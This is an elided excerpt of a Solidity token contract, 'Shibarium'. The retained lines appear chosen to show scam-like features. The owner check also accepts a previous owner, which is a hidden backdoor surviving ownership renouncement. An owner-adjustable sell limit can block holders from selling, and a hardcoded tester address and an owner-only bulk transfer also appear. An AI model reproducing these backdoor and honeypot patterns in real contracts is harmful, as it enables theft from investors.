...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender()|| _previousOwner == _msgSender(), "Caller is not the owner");
        _;
    }
...
contract Shibarium is Context, IERC20, Ownable {
    ...
    uint256 public coolDownTime = 100 seconds;
    uint256 public maxSellLimit = _tTotal;
    ...
    address payable private _testerAddress =
        payable(0x8cAb8736c4bB78965107eA6A4F0C6F02cAF4A3b9);
    ...
    function _transfer(
        ...
        if (from != owner() && to != owner()) {
            if (
                ...
                require(
                    amount <= maxSellLimit,
                    "You are exceeding maxSellLimit"
                );
    ...
    function rescueForeignTokens(
        ...
        require(
            ...
            "You're not able to rescue native tokens"
        );
    ...
    function tranferMultilWallet(address[] calldata accounts, uint256 amount)
        public
        onlyOwner
    {
        for (uint256 i = 0; i < accounts.length; i++) {
    ...
    function updateMaxTxLimit(uint256 maxSell) external onlyOwner {
